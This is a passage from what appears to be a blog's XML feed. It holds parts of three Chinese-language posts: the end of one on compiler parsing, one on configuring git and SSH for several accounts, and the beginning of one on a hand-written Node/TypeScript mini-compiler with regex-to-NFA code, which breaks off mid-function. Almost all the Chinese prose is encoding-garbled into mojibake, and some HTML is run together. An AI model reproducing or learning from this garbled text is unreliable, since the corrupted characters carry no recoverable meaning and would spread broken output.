çš„è¿‡ç¨‹ï¼Œè¿™ä¸€éƒ¨åˆ†å‚ç…§ä¼ªä»£ç çš„ï¼Œåº”è¯¥æ²¡å•¥å¤§é—®é¢˜ï¼›</p></li><li><p>ast ç”Ÿæˆéƒ¨åˆ†ï¼šè¿™ä¸€æ­¥æ–‡æ³•åˆ†æè¡¨ç”Ÿæˆæ˜¯å‚ç…§ä¼ªä»£ç çš„ï¼Œåé¢çš„ astç”Ÿæˆè¿‡ç¨‹æ˜¯çº¯æ‰‹å†™ï¼Œå…¶å®åœ¨å®ç°çš„è¿‡ç¨‹ä¸­ï¼Œä¹Ÿå‘ç°æ•´ä¸ªè¿‡ç¨‹å’Œ bison çš„ yyæ–‡ä»¶å¦‚å‡ºä¸€è¾™ï¼Œä¸çŸ¥é“ bison æ˜¯æ€ä¹ˆå®ç°çš„ ğŸ˜¯ï¼Œæœ¬æ¥æ˜¯æƒ³å¼„æˆç®€å•çš„ bisonæ–‡ä»¶ç¼–å†™æ–‡æ³•è§„åˆ™çš„ï¼Œä½†æ˜¯æ—¶é—´ä¸å…è®¸ï¼Œåé¢å†æŠ½ç©ºçœ‹ä¸‹ã€‚astç”Ÿæˆè¿™ä¸€éƒ¨åˆ†ä¸»è¦æ˜¯åœ¨è§„çº¦åŠ¨ä½œä¸Šæ”¾ç½®ä¸€äº›ç”¨æˆ·å®šä¹‰åŠ¨ä½œï¼Œè¿™é‡Œå°±æ˜¯å†™æ­»çš„ç”Ÿæˆå¯¹åº”æ–‡æ³•è¡¨è¾¾å¼çš„ç±»ï¼Œè‡ªåº•å‘ä¸Šæ„å»ºast</p></li><li><p>è¿™æ¯”ä¸€éƒ¨åˆ†ç†è®ºå…¶å®æŒºå¤šçš„ï¼Œä½†æ˜¯åœ¨æœ¬é¡¹ç›®é‡Œåªè¦è€ƒè™‘å‘¨åˆ°å³å¯ï¼Œé˜²æ­¢åœ¨ç¼–è¯‘çš„æœ€å¥½é˜¶æ®µæŠ¥é”™ï¼Œä¹Ÿæ˜¯çº¯æ‰‹å†™çš„</p></li><li><p>æ±‡ç¼–ç”Ÿæˆéƒ¨åˆ†ï¼šè¿™ä¸€éƒ¨åˆ†ä¸ªäººè§‰å¾—æœ€æ¶å¿ƒäº†ï¼Œå› ä¸ºæ±‡ç¼–æ¯”è¾ƒéš¾è°ƒè¯•ï¼Œæ¯æ¬¡æœ‰bugéƒ½éœ€è¦æ±‡ç¼–è¯­å¥ä¸€å¥ä¸€å¥çœ‹ï¼Œå…¶å®å›è¿‡å¤´çœ‹ï¼Œè¿™æ ·æŠŠå…ƒè¡¨è¾¾å¼ï¼ˆåƒ+-<em>/èµ‹å€¼è¯­å¥ï¼‰çš„å¯„å­˜å™¨åˆ†é…è®¾è®¡å†™å¥½äº†ï¼Œå°±å¯ä»¥æ‹¿å®ƒä»¬ç»„åˆæˆæ›´å¤§çš„åŸä»¶ã€‚è¿™é‡Œä¹Ÿæ˜¯çº¯æ‰‹å†™çš„ï¼Œæœ‰ä¸€ä¸ªæ¯”è¾ƒå›°æ‰°æˆ‘çš„ç‚¹ï¼Œåƒif-elseé‡Œé¢å£°æ˜çš„å˜é‡å¦‚ä½•åœ¨è¿è¡Œæ—¶å€™åˆ†é…å†…å­˜ï¼Ÿæˆ‘ä»¬éƒ½çŸ¥é“å±€éƒ¨å˜é‡åœ¨ä¸è€ƒè™‘ç”¨å¯„å­˜å™¨ä¼˜åŒ–çš„æƒ…å†µä¸‹ï¼Œä¸€èˆ¬éƒ½æ˜¯å­˜å‚¨åœ¨æ ˆå†…çš„ï¼Œåƒå‚æ•°éƒ½æ˜¯åŸºäºfp(æ ˆæŒ‡é’ˆ)è¿›è¡Œå¯»å€çš„ï¼Œæ¯”å¦‚å½¢å¼å‚æ•° x,yï¼Œåœ¨ç”Ÿæˆæ±‡ç¼–çš„æ—¶å€™å°±è¦è®°å½•ï¼Œè¿™é‡Œæˆ‘æ‹¿æ•°ç»„çš„[x, y]ï¼Œè¿™æ · x çš„åç§»é‡å°±æ˜¯fp + 1 </em> 4, y å°±æ˜¯ fp + 2 * 4ï¼Œä½†æ˜¯åƒ if elseé‡Œé¢çš„å£°æ˜çš„å˜é‡åªæœ‰è¿è¡Œåˆ°å¯¹åº”çš„åˆ†æ”¯æ‰èƒ½åˆ†é…å†…å­˜ï¼Œä¹Ÿå°±æ˜¯è¯´å¦ä¸€ä¸ªæ²¡æœ‰æ‰§è¡Œçš„åˆ†æ”¯æ˜¯ä¸éœ€è¦åˆ†é…å†…å­˜çš„ã€‚</p></li></ol><h3 id="å‚è€ƒæ–‡ç« ">å‚è€ƒæ–‡ç« </h3><p><ahref="https://blog.csdn.net/qq_42977003/article/details/112341427">LL1æ–‡æ³•ã€LR(0)æ–‡æ³•ã€SLRæ–‡æ³•ã€LR(1)æ–‡æ³•ã€LALRæ–‡æ³•_ä¸ç§¯ç¡…æ­¥çš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://zhuanlan.zhihu.com/p/77663680">æ ˆå’Œæ ˆå¸§ - çŸ¥ä¹(zhihu.com)</a></p><p><ahref="https://www.cnblogs.com/henuliulei/p/10872483.html">LL(1),LR(0),SLR(1),LALR(1),LR(1)å¯¹æ¯”ä¸åˆ†æ- ä½ çš„é›·å“¥ - åšå®¢å›­ (cnblogs.com)</a></p><p><ahref="https://wangwangok.github.io/2020/05/05/bottom2top_syntax_parser_lalr/#:~:text=â€œè§„èŒƒLRâ€">è¯­æ³•åˆ†æâ€”â€”è‡ªåº•å‘ä¸Šè¯­æ³•åˆ†æä¸­çš„è§„èŒƒLRå’ŒLALRÂ· å‡Œäº‘å£®å¿—å¹¾å¤šæ„ (wangwangok.github.io)</a></p>]]></content>
    
    
    <categories>
      
      <category>ç¼–è¯‘åŸç†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ç¼–è¯‘åŸç†ï¼Œè®¡ç®—æœºåŸºç¡€, node</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gitå¤šè´¦å·ç®¡ç†</title>
    <link href="/emocoder/2023/05/05/git%E5%A4%9A%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/"/>
    <url>/emocoder/2023/05/05/git%E5%A4%9A%E8%B4%A6%E5%8F%B7%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p>ä¸ºä»€ä¹ˆæäº¤äº†ä»£ç å¹¶æ¨é€åˆ°githubï¼Œä½†æ˜¯githubä¸Šçš„contributionså¹¶æ²¡æœ‰å¢åŠ å‘¢ï¼Ÿ</p><p>å…¶ä¸­Githubå®˜æ–¹ç»™å‡ºäº†ä¸€ä¸ªå®˜æ–¹æ–‡ä»¶ï¼Œå‘Šè¯‰æˆ‘ä»¬ä»€ä¹ˆæ ·çš„Commitå¯ä»¥è¢«è®°å…¥Contributionï¼Œè¯·ç‚¹å‡»æ­¤å¤„æŸ¥çœ‹ã€‚</p><p>åœ¨å®˜æ–¹çš„å¸®åŠ©æ–‡æ¡£ä¸­ï¼Œæœ‰ä¸€æ¡æ˜¯Commitè¢«è®°å…¥Contributionä¸­å¿…é¡»æ»¡è¶³ç”¨äºCommitçš„é‚®ä»¶åœ°å€å¿…é¡»ä¸Githubè´¦æˆ·ç›¸å…³è”ã€‚å…¶å®ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæˆ‘çš„Commitæ²¡æœ‰è¢«è®°å…¥Contributionå’Œä¸æ˜¾ç¤ºå¤´åƒçš„åŸå› ï¼Œä¹Ÿæ˜¯å¤§å¤šæ•°äººä¹Ÿæ˜¯è¿™ä¸ªåŸå› </p><p>https://docs.github.com/en/account-and-profile/setting-up-and-managing-your-github-profile/managing-contribution-settings-on-your-profile/why-are-my-contributions-not-showing-up-on-my-profile</p><p>æˆ‘é‡åˆ°çš„é—®é¢˜çš„è§£å†³æ–¹æ¡ˆæ˜¯ï¼šè¯¥ä»“åº“çš„æœ¬åœ°çš„é‚®ç®±å’Œgithubè´¦æˆ·çš„é‚®ç®±ä¸æ˜¯åŒä¸€ä¸ªé…ç½®ï¼šå¯ä»¥ä¿®æ”¹æœ¬åœ°ä»“åº“çš„é‚®ç®±å’Œgithubä¸Šä¸€è‡´ï¼šgit config --local user.name å¼ ä¸‰ git config --local user.emailzhansan@996icu.com</p><p>å¦‚æœæ‹¿åˆ°ä¸€å°å…¬å¸ç”µè„‘, é‚£ä¹ˆå°±è¯·æŒ‰ç…§ä¸‹é¢çš„æœ€ä½³å®è·µé…ç½®ä¸‹gitçš„å¤šç¯å¢ƒ:è¯·å…ˆæ‰§è¡Œå‘½ä»¤æ‰“å¼€é…ç½®æ–‡ä»¶ vi ~/.ssh/config</p><p>ç„¶åè¾“å…¥ä»¥ä¸‹å†…å®¹ï¼š # gitlab Host gitlab User git HostNamegitlab.company.com PreferredAuthentications publickey IdentityFile~/.ssh/gitlab_rsa ServerAliveInterval 300 ServerAliveCountMax 10 #github Host github User git HostName github.com PreferredAuthenticationspublickey IdentityFile ~/.ssh/github_rsa ServerAliveInterval 300ServerAliveCountMax 10</p><p>è¿™é‡Œå”¯ä¸€éœ€è¦æ›¿æ¢çš„gitlabé‡Œçš„HostNameéƒ¨åˆ†, æ”¹æˆä½ ä»¬å…¬å¸çš„gitåœ°å€.</p><p>é‡åˆ°GitHubæŠ¥permission deniedé”™å°±æ‰§è¡Œï¼šssh-add -k ~/.ssh/github_rsaé‡åˆ°gitlabæŠ¥permission deniedé”™å°±æ‰§è¡Œï¼šssh-add -k ~/.ssh/gitlab_rsa</p><p>æ¨èé˜…è¯»ï¼šhttps://zhuanlan.zhihu.com/p/62071906</p>]]></content>
    
    
    <categories>
      
      <category>git/github</category>
      
    </categories>
    
    
    <tags>
      
      <tag>github, git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/emocoder/2023/05/05/minic/"/>
    <url>/emocoder/2023/05/05/minic/</url>
    
    <content type="html"><![CDATA[<h1 id="node-æ‰‹å†™ç¼–è¯‘å™¨-minicompiler">node æ‰‹å†™ç¼–è¯‘å™¨-minicompiler</h1><p>ä½¿ç”¨è¯­è¨€ï¼šnode, C++æœ¬æ–‡æ¶‰åŠï¼šç¼–è¯‘å™¨çš„è¯æ³•åˆ†æï¼ŒæŠ½è±¡è¯­ä¹‰æ ‘ç”Ÿæˆï¼Œè¯­æ³•åˆ†æï¼Œä»£ç ç”Ÿæˆæœ¬æ–‡é‡ç‚¹å†…å®¹ï¼š</p><ol type="1"><li>å®ç°æ­£åˆ™è¡¨è¾¾å¼åˆ†æå™¨</li><li>å®ç°ç®€æ˜“ç‰ˆ Flex</li><li>å®ç° LR0 è¯­æ³•ï¼Œå¹¶ç®€å•ä»‹ç»å…¶ä»–è¯­æ³•(LL, LR1, SLR, LSPR)</li><li>å®ç°ç®€æ˜“ç‰ˆ Bison</li><li>å®ç°ç”Ÿæˆæ±‡ç¼–ä»£ç </li><li>å®ç°ç®€æ˜“ç¼–è¯‘å™¨åŠŸèƒ½ï¼Œæä¾›ç¼–è¯‘æ—¶æœŸç±»å‹æ£€æŸ¥å’Œæ¨æ–­ï¼Œæ”¯æŒåŠ å‡ä¹˜é™¤æ”¯æŒå‡½æ•°çš„é€’å½’è°ƒç”¨ï¼Œä»¥åŠ</li></ol><p>ä¼šåŒ…å«çš„ï¼š</p><ol type="1"><li>å®ç° nfaï¼Œä»¥åŠè”åˆ nfa =&gt; dfaï¼Œè¿›è¡Œè¯æ³•åˆ†æ</li><li>å®ç° dfaï¼Œè¿›è¡Œè¯­æ³•åˆ†æï¼Œå¹¶åŸºäºæ­¤æ„å»ºæŠ½è±¡è¯­æ³•æ ‘(AST)</li><li>åŸºäº ast è¿›è¡Œè¯­è¨€ä¹‰åˆ†æ(ç±»å‹æ£€æŸ¥ä»¥åŠæ˜¯å¦ç¬¦åˆè¯­è¨€è§„èŒƒ)</li><li>åŸºäº astç”Ÿæˆæ±‡ç¼–ä»£ç ï¼Œè™½ç„¶æœ¬æ–‡æ²¡æœ‰æ˜¾ç¤ºçš„ç»ˆä¸­é—´ä»£ç ç”Ÿæˆè¿‡ç¨‹ï¼Œä½†æ˜¯ä¹Ÿæœ‰ç±»ä¼¼çš„æ€æƒ³</li></ol><p>ä¸ä¼šåŒ…å«çš„ï¼šæœ¬è¯­è¨€æ¯”è¾ƒç®€å•ï¼Œä¸åŒ…å«å¤æ‚æ•°æ®ç»“æ„çš„æ”¯æŒï¼Œå¦‚æ•°ç»„å¯¹è±¡ç­‰å…¶ä»–åŠŸèƒ½ï¼›ä¸ä¼šæ¶‰åŠå¤æ‚çš„ç¼–è¯‘å™¨åç«¯çŸ¥è¯†ï¼šå¦‚åƒåœ¾å›æ”¶ï¼Œå¯„å­˜å™¨æŸ“è‰²ï¼Œæ•°æ®æµåˆ†æç­‰ç­‰</p><p>minic è¯­æ³•ï¼š</p><ol type="1"><li>è¿ç®—ç¬¦ï¼šæ”¯æŒ+-*/è¿ç®—ï¼Œä¸æ”¯æŒä¼˜å…ˆçº§(, )</li><li>ç±»å‹ï¼šæ”¯æŒè‡ªç„¶æ•°(int ç±»å‹)ï¼Œå­—ç¬¦ä¸²ï¼Œå¸ƒå°”å€¼ä»¥åŠ void</li><li>è¯­å¥ï¼šæ”¯æŒå‡½æ•°è°ƒç”¨ï¼ŒåµŒå¥—çš„ if-elseè¯­å¥ï¼ˆif-elseå¿…é¡»æˆå¯¹å‡ºç°ï¼Œå¦‚ä¸‹çš„è¯­æ³•æ˜¯ä¸å…è®¸çš„ï¼‰</li><li>å’Œ C ä¸€æ ·ï¼Œå¿…é¡»è¦æœ‰ main å‡½æ•°</li><li>å˜é‡å¿…é¡»å£°æ˜çš„æ—¶å€™åŒæ—¶èµ‹å€¼ï¼Œå¦‚ä¸‹çš„å£°æ˜æ˜¯ä¸å…è®¸çš„</li><li>å…è®¸å—çº§ä½œç”¨åŸŸ</li><li>å…è®¸è¿”å›å€¼æ˜¯æ¡ä»¶è¡¨è¾¾å¼ï¼Œè¿ç®—è¡¨è¾¾å¼</li><li>è¿ç®—ç¬¦å·¦å³ä¸¤ä¾§ä»…å¯ä»¥æ˜¯å˜é‡æˆ–æ˜¯æ•°å­—</li></ol><h2 id="ä¸€minic-è¯­æ³•">ä¸€ã€minic è¯­æ³•ï¼š</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sum</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> &#123;<br>  <span class="hljs-keyword">return</span> x + y;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">feb</span><span class="hljs-params">(x: <span class="hljs-type">int</span>)</span> &#123;<br>  <span class="hljs-keyword">if</span> (x == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> x;<br>  &#125;<br>  <span class="hljs-keyword">return</span> x + feb(x<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä¼šä»ä»¥ä¸‹å››ä¸ªæ–¹é¢ä¾æ¬¡å…¥æ‰‹ï¼š</p><ol><li>parser</li><pre><code class="hljs">&lt;ul&gt;&lt;li&gt;æ­£åˆ™&lt;/li&gt;&lt;li&gt;todo&lt;/li&gt;&lt;/ul&gt;</code></pre><li>sematic</li><ul><li>slr</li><li>è¯­ä¹‰åˆ†æ</li><li>todo</li></ul><li>ä»£ç ç”Ÿæˆ</li><li>å¯è§†åŒ–</li><h2 id="äºŒparser">äºŒã€parser</h2><p>åœ¨è¯æ³•åˆ†æé˜¶æ®µï¼Œè¾“å…¥æ˜¯å­—ç¬¦ä¸²ï¼Œè¾“å‡ºæ˜¯ token æµï¼Œè¿™é‡Œ tokenæµæœ‰ä¸€ä¸ªå‘ï¼Œä¸€å¼€å§‹æˆ‘çš„è¾“å‡ºæ˜¯æšä¸¾å€¼çš„æ•°ç»„ï¼Œç±»ä¼¼è¿™æ ·:<code>[TYPE, ID, BRACE, ...]</code>ï¼Œä½†æ˜¯è¿™æ ·ä¼šæœ‰é—®é¢˜ï¼Œå› ä¸ºè¯ç´ å€¼æ²¡åŠæ³•ä¿ç•™ä¸‹æ¥ï¼Œæ‰€ä»¥åé¢æ”¹æˆäº†å¦‚ä¸‹è¾“å‡º:<code>[(line_num, TYPE, int), (line_num, ID, feb)]</code>ï¼Œ(è¡Œå·ï¼Œç±»å‹,è¯ç´ å€¼)ä¸‰å…ƒç»„ å­¦è¿‡ç¼–è¯‘åŸç†éƒ½çŸ¥é“ï¼Œéœ€è¦æœ‰è‡ªåŠ¨æœºæŠŠè¾“å…¥æµï¼Œè½¬æˆä¸€ä¸ªä¸ªtokenï¼Œæ¯”å¦‚å½“è¯æ³•åˆ†æå™¨è¯»å®Œ int çš„æ—¶å€™ï¼Œè¿™æ—¶å€™å°±ä¼šè¿”å›ä¸€ä¸ª TYPEtokenï¼Œä½†æ˜¯å¦‚æœæ˜¯ int1ï¼Œå°±åº”è¯¥è¿”å›ä¸€ä¸ª IDtokenï¼Œæ‰€ä»¥è¿™é‡Œæ¶‰åŠåˆ°è´ªå©ªè¯»å–ï¼Œå¦å¤–å¯¹äºåƒ ifè¿™ç§å…³é”®å­—ï¼Œå¦‚æœåŒæ—¶æ»¡è¶³å¤šç§ç»ˆç»“çŠ¶æ€ï¼Œåº”è¯¥æ¶‰åŠåˆ°ä¼˜å…ˆçº§</p><p>é‚£ä¹ˆå¦‚ä½•æ„å»ºè‡ªåŠ¨æœºï¼Ÿ é¦–å…ˆæˆ‘ä»¬çš„ç›®æ ‡æ˜¯å¯¹æ¯ç§ç‰¹å®šçš„ tokenè®¾ç½®å¯¹åº”çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¹¶ç”Ÿæˆå¯¹åº”çš„ dfaï¼Œç”¨è¿‡ flexçš„åŒå­¦åº”è¯¥éƒ½çŸ¥é“ï¼Œæ¯”å¦‚ï¼š</p><p>ç„¶åæˆ‘ä»¬æŠŠè¿™äº› dfa æ„å»ºä¸ºä¸€ä¸ªå¤§çš„ nfaï¼Œå†æŠŠ nfa è½¬ä¸º dfa</p><p>æˆ‘ä»¬çš„è¯æ³•åˆ†æå™¨æ”¯æŒä»¥ä¸‹å‡ ä¸ªå•å…ƒï¼š +: a+, ?: a?, <em>: a</em>, è¿æ¥:abï¼Œ é€»è¾‘æˆ–: a|bï¼Œ å­—ç¬¦é›†: [a-z] æ”¯æŒå°‘éƒ¨åˆ†å­—ç¬¦è½¬ä¹‰ï¼š,Â t, </p><p>å¦‚ä½•æŠŠæ­£åˆ™è¡¨è¾¾å¼æ„å»ºä¸ºdfaï¼šå¯¹äºæ¯ä¸€ä¸ªå•å…ƒæ­£åˆ™è¡¨è¾¾å¼ï¼Œå¯ä»¥ç›´æ¥ç”Ÿæˆå¯¹åº”çš„èŠ‚ç‚¹ï¼Œä½†æ˜¯æœ‰äº›é—®é¢˜æˆ‘ä»¬éœ€è¦æ³¨æ„ï¼šæˆ‘ä»¬çš„è¾“å…¥æ˜¯ä¸€ä¸ªä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œæ­£åˆ™è¡¨è¾¾å¼æœ¬èº«å¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªä¸ªå•å…ƒï¼Œè€Œè¿™äº›å•å…ƒåˆå¯èƒ½æ˜¯å­—ç¬¦æˆ–è€…å…¶ä»–å•å…ƒå’Œæˆçš„ï¼Œå¦‚ï¼ša|b å°±æ˜¯ä¸€ä¸ªå•å…ƒï¼Œä½†æ˜¯å…¶ç»„æˆå°±æ˜¯ 2 ä¸ªå­—ç¬¦ [a-z]|aå°±æ˜¯ä¸€ä¸ªå•å…ƒ+ä¸€ä¸ªæ™®é€šå­—ç¬¦å¦å¤–å¯¹äºä¸­æ‹¬å·è¿™ç§è¿˜éœ€è¦ç‰¹æ®Šå¤„ç†ï¼Œæ€è·¯å¦‚ä¸‹ï¼šå³ä½¿æ˜¯å­—ç¬¦ä¹Ÿä¼šæŠ½è±¡æˆèŠ‚ç‚¹çš„æ¦‚å¿µï¼Œå¦å¤–åœ¨ç”Ÿæˆè‡ªåŠ¨æœºçš„è¿‡ç¨‹ä¸­ï¼Œç”±äºå­˜åœ¨[]ï¼Œ+ï¼Œ*ç­‰ç­‰è¿™æ ·çš„ä¿®é¥°ç¬¦å·ï¼Œè€ƒè™‘ä½¿ç”¨stack è¿›è¡Œå­˜å‚¨ï¼Œä¸€èˆ¬çš„ï¼Œå½¢å¼åŒ–å¦‚ä¸‹ï¼šå¯¹äºæ­£åˆ™è¡¨è¾¾å¼ xxxxx å…¶ä¸­ Xä¸ºå¯èƒ½çš„ä»»æ„å­—ç¬¦ï¼Œ<code>stack = []</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">i = <span class="hljs-number">0</span><br>pattern = <span class="hljs-string">&#x27;XXXX&#x27;</span><br><span class="hljs-keyword">while</span> (i &lt; len(pattern)) &#123;<br>  <span class="hljs-keyword">auto</span> node = getNode(pattern[i]);<br>  <span class="hljs-built_in">stack</span>.push(node);<br>&#125;<br><br>node <span class="hljs-title function_">getNode</span><span class="hljs-params">(<span class="hljs-built_in">string</span> s)</span> &#123;<br>  <span class="hljs-keyword">if</span> (s === <span class="hljs-string">&#x27;]&#x27;</span>)<br>  <span class="hljs-keyword">if</span> (s === <span class="hljs-string">&#x27;+&#x27;</span>)<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ getNodeå‡½æ•°åšçš„äº‹è¯·å°±æ˜¯è¯†åˆ«ç‰¹å®šçš„ç¬¦å·ï¼Œç„¶åç”¨å¯¹åº”çš„æ­£åˆ™è¡¨è¾¾å¼å‡½æ•°ç”Ÿæˆå³å¯ï¼Œæ¯”å¦‚å¯¹äºç‰¹æ®Šçš„ç¬¦å·:[],éœ€è¦æ”¶é›†å…¶åŒ…å«çš„å­—ç¬¦é›†ï¼Œç„¶åæ„å»ºä¸€ä¸ªå¦‚å›¾çš„åŸºæœ¬æ­£åˆ™å•å…ƒï¼›å†æ¯”å¦‚a+ï¼Œæˆ‘ä»¬éœ€è¦ä» stack å†… pop å‡ºä¸€ä¸ªå…ƒç´ ï¼Œç”Ÿæˆå¯¹åº”çš„åŸºæœ¬æ­£åˆ™å•å…ƒã€‚</p><p>æœ€åï¼Œæ‰€æœ‰çš„ç‰¹æ®Šç¬¦å·å¤„ç†å®Œæˆï¼Œä¹Ÿå°±æ„å‘³ç€æ ˆå†…åªæœ‰æ­£åˆ™è¡¨è¾¾å¼å•å…ƒè¿™ç§æ•°æ®ç»“æ„ï¼Œè¿™äº›èŠ‚ç‚¹ä¹‹é—´æ²¡æœ‰ä»»ä½•ä¿®é¥°ç¬¦(å› ä¸ºä¿®é¥°ç¬¦ä¹‹å‰éƒ½è¢«å¤„ç†å®Œäº†ï¼Œé™¤äº†è¿æ¥è¿ç®—)ï¼Œç„¶åæˆ‘ä»¬ä¾æ¬¡è¿æ¥è¿™äº›èŠ‚ç‚¹å³å¯ï¼Œå¦å¤–å¯¹äºæ¯ä¸ªæ­£åˆ™çš„å¶å­èŠ‚ç‚¹ç¡®å®šï¼Œå³å½“å‰æ ˆé¡¶å…ƒç´ çš„æœ€åä¸€ä¸ªèŠ‚ç‚¹(å› ä¸ºæ ˆé¡¶å…ƒç´ å¯¹åº”æ­£åˆ™çš„æœ«å°¾)ã€‚</p><p>æˆ‘ä»¬å¯ä»¥æä¾›ç›¸åº”çš„å‡½æ•°ï¼Œæˆ‘ä»¬çš„è¯æ³•åˆ†æå™¨åŒ…å«ä»¥ä¸‹å‡ ç§åŸºæœ¬æ­£åˆ™å•å…ƒï¼š</p><ol type="1"><li>è¿æ¥è¿ç®—ç¬¦</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs node">export function connect(from: VertexNode, to: VertexNode): VertexNode &#123;<br>  // fromçš„å°¾å’Œtoçš„å¤´ç›¸äº’è¿æ¥,æ³¨æ„circle<br>  let cur = graph.getVertex(from.index); // è·å–é‚»æ¥è¡¨<br>  const memo: number[] = [];<br>  while (cur.firstEdge &amp;&amp; !memo.includes(cur.index)) &#123;<br>    memo.push(cur.index);<br>    cur = graph.getVertex(cur.firstEdge.index);<br>  &#125;<br><br>  graph.getVertex(cur.index).firstEdge = new Node(<br>    to.index,<br>    graph.getVertex(cur.index).firstEdge<br>  );<br>  return from;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2" type="1"><li>é€»è¾‘æˆ–</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs node">export function or(a: VertexNode, b: VertexNode): VertexNode &#123;<br>  const nodeStart = new VertexNode(Graph.node_id, null);<br>  graph.addVertexNode(nodeStart, nodeStart.index);<br>  nodeStart.firstEdge = new Node(a.index, null, a.edgeVal || null);<br>  nodeStart.firstEdge.next = new Node(b.index, null, b.edgeVal || null);<br>  const nodeEnd = new VertexNode(Graph.node_id, null);<br>  graph.addVertexNode(nodeEnd, nodeEnd.index);<br>  connect(a, nodeEnd);<br>  connect(b, nodeEnd);<br>  return nodeStart;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="3" type="1"><li>å­—ç¬¦é›†</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs node">export function characters(chars: string[]) &#123;<br>  const nodeStart = new VertexNode(Graph.node_id, null);<br>  graph.addVertexNode(nodeStart, nodeStart.index);<br>  const nodeEnd = new Node(Graph.node_id, null, chars);<br>  const tmp = new VertexNode(nodeEnd.index, chars);<br>  graph.addVertexNode(tmp, tmp.index);<br><br>  const pre = nodeStart.firstEdge;<br>  nodeStart.firstEdge = nodeEnd;<br>  nodeEnd.next = pre;<br><br>  return nodeStart;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="4" type="1"><li>*ä¿®é¥°ç¬¦</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs node">export function mutipliy(wrapped: VertexNode): VertexNode &#123;<br>  const nodeStart = new VertexNode(Graph.node_id, null);<br>  graph.addVertexNode(nodeStart, nodeStart.index);<br>  const tmp = new Node(wrapped.index, null, null);<br>  nodeStart.firstEdge = tmp;<br>  let cur = graph.getVertex(wrapped.index); // è·å–é‚»æ¥è¡¨<br>  while (cur.firstEdge) &#123;<br>    cur = graph.getVertex(cur.firstEdge.index);<br>  &#125;<br>  connect(cur, nodeStart);<br>  return nodeStart;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="5" type="1"><li>+ä¿®é¥°ç¬¦</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs node">export function plus(base: VertexNode) &#123;<br>  // åŸºäºoldæ–°å»ºèŠ‚ç‚¹<br>  let nodeStart = new VertexNode(Graph.node_id, base.edgeVal);<br>  nodeStart.firstEdge = base.firstEdge;<br>  const res = nodeStart;<br>  graph.addVertexNode(nodeStart, nodeStart.index);<br>  let cur = base?.firstEdge;<br>  while (cur) &#123;<br>    const vertexNode = graph.getVertex(cur?.index);<br>    const tmp = new VertexNode(Graph.node_id, vertexNode.edgeVal);<br>    nodeStart.firstEdge = new Node(tmp.index, null, vertexNode.edgeVal);<br>    nodeStart = tmp;<br>    tmp.firstEdge = base.firstEdge;<br>    graph.addVertexNode(tmp, tmp.index);<br>    cur = vertexNode.firstEdge;<br>  &#125;<br>  return 